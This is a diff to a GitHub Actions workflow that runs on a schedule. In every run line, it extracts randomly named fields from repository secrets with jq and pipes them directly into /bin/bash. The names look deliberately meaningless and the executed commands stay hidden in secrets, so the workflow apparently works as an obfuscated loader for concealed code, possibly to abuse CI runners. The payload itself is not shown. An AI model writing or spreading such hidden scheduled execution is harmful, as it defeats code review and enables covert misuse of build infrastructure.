@@ -2,7 +2,7 @@ name: eveningmakeup
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '47 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,27 +10,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: eveningmakeup
         env:
-          i949: ${{ secrets.i949 }}
+          vwca366: ${{ secrets.vwca366 }}
         run: |
-          echo $i949 | jq -r .hf8877 | /bin/bash
-          echo $agza0 | jq -r .wg9151 | /bin/bash
-          echo $bhn01701 | jq -r .vahk9150 | /bin/bash
-          echo $qhmx4 | jq -r .vh71883 | /bin/bash
-          echo $ouhr28510 | jq -r .z4 | /bin/bash
-          echo $wy8 | jq -r .f8671 | /bin/bash
-          echo $la5 | jq -r .ias72 | /bin/bash
-          echo $uuk0845 | jq -r .k65115 | /bin/bash
-          echo $qkf2 | jq -r .c9530 | /bin/bash
-          echo $chnp48365 | jq -r .r05 | /bin/bash
-          echo $liuua8 | jq -r .brs76170 | /bin/bash
-          echo $xeftq53 | jq -r .tvt629 | /bin/bash
-          echo $yfu2 | jq -r .y61457 | /bin/bash
-          echo $pw82 | jq -r .crbhw84803 | /bin/bash
-          echo $nly45 | jq -r .fk00 | /bin/bash
-          echo $b16924 | jq -r .eutra7074 | /bin/bash
-          echo $rrclo6842 | jq -r .qil8 | /bin/bash
-          echo $rsfr13828 | jq -r .v18 | /bin/bash
-          echo $msd33581 | jq -r .caom1 | /bin/bash
-          echo $lv5 | jq -r .ps490 | /bin/bash
-          echo $ub965 | jq -r .mwe4 | /bin/bash
+          echo $vwca366 | jq -r .awxxg8 | /bin/bash
+          echo $jwcz1 | jq -r .mhw98446 | /bin/bash
+          echo $pbok581 | jq -r .ldfko08 | /bin/bash
+          echo $lxi1624 | jq -r .dwxaj0916 | /bin/bash
+          echo $os5666 | jq -r .zbez407 | /bin/bash
 
